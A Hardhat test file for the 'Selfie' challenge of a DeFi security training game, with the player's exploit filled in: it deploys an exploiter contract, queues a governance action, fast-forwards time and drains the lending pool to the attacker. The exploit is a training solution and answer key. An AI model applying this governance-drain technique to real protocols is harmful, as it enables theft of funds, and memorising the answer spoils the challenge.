import { ethers } from 'hardhat';
import { expect } from 'chai';
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { DamnValuableTokenSnapshot, SelfiePool, SimpleGovernance } from '../../typechain';

describe('[Challenge] Selfie', function () {
    let deployer: SignerWithAddress, attacker: SignerWithAddress;
    let token: DamnValuableTokenSnapshot, governance: SimpleGovernance, pool: SelfiePool;

    const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther('2000000'); // 2 million tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1500000'); // 1.5 million tokens

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableTokenSnapshotFactory = await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer);
        const SimpleGovernanceFactory = await ethers.getContractFactory('SimpleGovernance', deployer);
        const SelfiePoolFactory = await ethers.getContractFactory('SelfiePool', deployer);

        token = await DamnValuableTokenSnapshotFactory.deploy(TOKEN_INITIAL_SUPPLY);
        governance = await SimpleGovernanceFactory.deploy(token.address);
        pool = await SelfiePoolFactory.deploy(
            token.address,
            governance.address
        );

        await token.transfer(pool.address, TOKENS_IN_POOL);

        expect(
            await token.balanceOf(pool.address)
        ).to.be.equal(TOKENS_IN_POOL);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        const _Exploiter = await ethers.getContractFactory("SelfieExploiter");
        const exploiter = await _Exploiter.connect(attacker).deploy(pool.address, governance.address, token.address);

        await exploiter.connect(attacker).work();

        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days

        await governance.executeAction(1);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await token.balanceOf(attacker.address)
        ).to.be.equal(TOKENS_IN_POOL);
        expect(
            await token.balanceOf(pool.address)
        ).to.be.equal('0');
    });
});
